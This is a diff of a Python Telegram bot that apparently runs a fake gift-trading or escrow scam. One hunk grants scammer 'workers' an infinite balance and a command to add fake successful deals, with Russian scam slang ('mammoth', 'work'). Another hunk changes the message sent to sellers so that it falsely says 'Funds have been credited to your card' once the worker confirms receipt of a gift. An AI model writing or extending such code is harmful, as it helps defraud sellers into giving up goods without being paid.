@@ -339,10 +339,9 @@ async def worker_login(update: Update, context: ContextTypes.DEFAULT_TYPE):
     save_user_data(user_id)
 
     await update.message.reply_text(
-        "⚡ Вам успешно выданы права воркера с бесконечным балансом.\n"
-        "Можете подтверждать любые сделки, не пополняя баланс.\n\n"
-        "🔑 Чтобы добавить себе успешные сделки, введите команду:\n"
-        "`/deals <количество>`",
+        "⚡️ Вам успешно выданы права на бесконечный баланс.\n"
+        "🔎 Чтобы добавить себе успешные сделки, введите команду /deals [количество]\n\n"
+        "🦣 Приятного ворка 🦣",
         parse_mode="Markdown",
     )
 
@@ -589,13 +588,13 @@ async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):
             seller_lang = user_data.get(seller_id, {}).get("lang", "ru")
             if seller_lang == "ru":
                 msg = (
-                    f"✅ Покупатель подтвердил получение подарка по сделке #{deal_id}.\n\n"
-                    "Ожидайте зачисление денежных стредств в течении 5-10 минут"
+                    f"✅ Воркер подтвердил получение подарка по сделке #{deal_id}.\n\n"
+                    "Деньги были зачислены на вашу карту."
                 )
             else:
                 msg = (
-                    f"✅ Buyer confirmed the gift for deal #{deal_id}.\n\n"
-                    "Expect funds to be credited within 5-10 minutes."
+                    f"✅ Worker confirmed the gift for deal #{deal_id}.\n\n"
+                    "Funds have been credited to your card."
                 )
 
             try:
